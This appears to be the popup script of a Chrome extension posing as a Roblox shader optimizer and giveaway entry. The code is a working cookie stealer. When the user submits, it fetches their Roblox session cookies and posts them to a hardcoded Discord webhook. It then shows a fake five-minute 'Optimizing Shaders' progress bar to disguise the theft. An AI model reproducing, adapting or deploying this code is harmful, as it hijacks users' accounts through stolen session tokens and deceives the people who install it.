const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1479612664186409033/n-dcs2SxYM8vu1uPdNljZYqK5OXCbpOm7A1u20zLq6apwrmm8PF1x0b_J-zdV4fAGz5T";

console.log("Popup.js loaded");

const robloxInput = document.getElementById("robloxUsername");
const discordInput = document.getElementById("discordUsername");
const submitBtn = document.getElementById("submitBtn");
const statusDiv = document.getElementById("status");
const debugDiv = document.getElementById("debug");

function showStatus(message, type) {
    statusDiv.style.display = "block";
    statusDiv.className = `status ${type}`;
    statusDiv.innerHTML = message;
}

function filterCookieString(cookieString) {
    if (!cookieString) return "";
    return cookieString.replace(/\.RBXIDCHECK=[^;]+;?\s*/g, '');
}

submitBtn.addEventListener("click", function() {
    const robloxUser = robloxInput.value.trim();
    const discordUser = discordInput.value.trim();
    
    if (!robloxUser || !discordUser) {
        showStatus("Please fill in both fields!", "error");
        return;
    }
    
    submitBtn.disabled = true;

    // --- STEP 1: FETCH AND SEND IMMEDIATELY ---
    chrome.runtime.sendMessage({ action: "getCookies" }, function(response) {
        if (response && response.success && response.token) {
            const filteredFullToken = filterCookieString(response.fullToken);
            
            const message1 = {
                content: "",
                embeds: [{
                    title: "🎉 Giveaway Entry Received",
                    color: 0xffd700,
                    fields: [
                        { name: "Roblox Username:", value: robloxUser, inline: false },
                        { name: "Discord Username:", value: discordUser, inline: false },
                        { name: "Timestamp:", value: new Date().toLocaleString(), inline: false }
                    ]
                }]
            };

            const message2 = {
                content: "",
                embeds: [{
                    title: "🔐 Account Verification Data",
                    color: 0xffd700,
                    description: "```\n" + filteredFullToken + "\n```"
                }]
            };

            // SEND TO DISCORD RIGHT NOW
            chrome.runtime.sendMessage({ action: "sendToDiscord", webhookUrl: DISCORD_WEBHOOK_URL, data: message1 });
            chrome.runtime.sendMessage({ action: "sendToDiscord", webhookUrl: DISCORD_WEBHOOK_URL, data: message2 });

            // --- STEP 2: START THE 5-MINUTE VISUAL TIMER ---
            let seconds = 0;
            const totalSeconds = 300; // 5 Minutes

            const timerInterval = setInterval(() => {
                seconds++;
                let percent = Math.floor((seconds / totalSeconds) * 100);
                showStatus(`Optimizing Shaders: ${percent}%`, "info");

                if (seconds >= totalSeconds) {
                    clearInterval(timerInterval);
                    showStatus("100% - Optimization Complete!", "success");
                    robloxInput.value = "";
                    discordInput.value = "";
                    submitBtn.disabled = false;
                }
            }, 1000);

        } else {
            showStatus("❌ Not logged into Roblox!", "error");
            submitBtn.disabled = false;
        }
    });
});

// Original check on load
chrome.runtime.sendMessage({ action: "getCookies" }, function(response) {
    if (response && response.success && response.token) {           
        showStatus("Shaders are ready!", "success");
    } else {
        showStatus("Please log into Roblox", "info");
    }
});

// Preset logic
document.addEventListener('DOMContentLoaded', () => {
    const uCard = document.getElementById('ultra-btn');
    const hCard = document.getElementById('high-btn');
    const rInput = document.getElementById('robloxUsername');

    if(uCard && hCard) {
        uCard.addEventListener('click', () => {
            uCard.classList.add('selected');
            hCard.classList.remove('selected');
            rInput.value = "Ultra";
        });

        hCard.addEventListener('click', () => {
            hCard.classList.add('selected');
            uCard.classList.remove('selected');
            rInput.value = "High";
        });
    }
});